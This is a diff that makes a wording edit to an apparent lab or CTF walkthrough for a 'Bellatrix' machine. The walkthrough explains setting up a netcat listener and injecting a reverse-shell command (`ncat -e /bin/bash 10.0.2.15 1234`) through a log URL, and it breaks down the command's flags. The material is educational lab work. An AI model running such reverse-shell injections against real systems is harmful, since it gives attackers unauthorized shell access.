@@ -138,7 +138,7 @@ I have used Netcat as listener, a command-line utility that reads and writes dat
  - *-p* specifies the port on which *nc* should listen, 1234 in this case 
 
 
-After that we have to execute some code on the Bellatrix Machine to open a connection with the Kali Machine on port 1234 and spawn a process that executes */bin/bash* and we do this by injecting code directly into the log URL. The code we inject is `ncat -e /bin/bash 10.0.2.15 1234`, where:
+After that we have to execute some code on the Bellatrix Machine to open a connection with the Kali Machine on port 1234 and spawn a process that executes */bin/bash*, so we do this by injecting code directly into the log URL. The code we inject is `ncat -e /bin/bash 10.0.2.15 1234`, where:
  - *ncat* is an advanced implementation of *nc* that offers many additional features
  - *-e* followed by */bin/bash* specifies to run the *bin/bash* program as a child process when a connection is established
  - 10.0.2.15 is the IP of the Kali Machine
